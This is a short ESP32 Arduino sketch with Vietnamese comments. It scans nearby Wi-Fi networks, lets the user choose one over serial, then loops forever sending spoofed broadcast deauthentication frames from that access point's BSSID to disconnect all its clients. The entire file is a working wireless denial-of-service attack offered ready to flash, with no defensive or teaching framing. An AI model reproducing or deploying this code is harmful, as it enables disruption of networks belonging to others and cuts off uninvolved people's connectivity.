#include "WiFi.h"
#include "esp_wifi.h"

// Hàm gửi gói deauth
void sendDeauth(uint8_t *mac, uint8_t channel) {
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01,              // Frame Control + Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Đích: broadcast
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],  // Nguồn (BSSID)
    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],  // BSSID
    0x00, 0x00,                          // Seq num
    0x07, 0x00                           // Reason code
  };

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_80211_tx(WIFI_IF_STA, packet, sizeof(packet), false);
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  Serial.println("Dang quet cac mang Wi-Fi...");
  int n = WiFi.scanNetworks();
  if (n == 0) {
    Serial.println("Khong tim thay mang nao!");
    return;
  }

  for (int i = 0; i < n; ++i) {
    Serial.printf("[%d] %s (MAC: %s, Kenh: %d)\n", i, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i));
  }

  Serial.println("\nNhap so thu tu mang can deauth: ");
  while (!Serial.available()) {}
  int choice = Serial.parseInt();

  if (choice >= 0 && choice < n) {
    uint8_t target_mac[6];
    sscanf(WiFi.BSSIDstr(choice).c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &target_mac[0], &target_mac[1], &target_mac[2],
           &target_mac[3], &target_mac[4], &target_mac[5]);

    int ch = WiFi.channel(choice);
    Serial.printf("Dang gui deauth toi %s tren kenh %d...\n", WiFi.SSID(choice).c_str(), ch);

    while (true) {
      sendDeauth(target_mac, ch);
      delay(1); // Gửi rất nhanh
    }
  } else {
    Serial.println("Lua chon khong hop le!");
  }
}

void loop() {}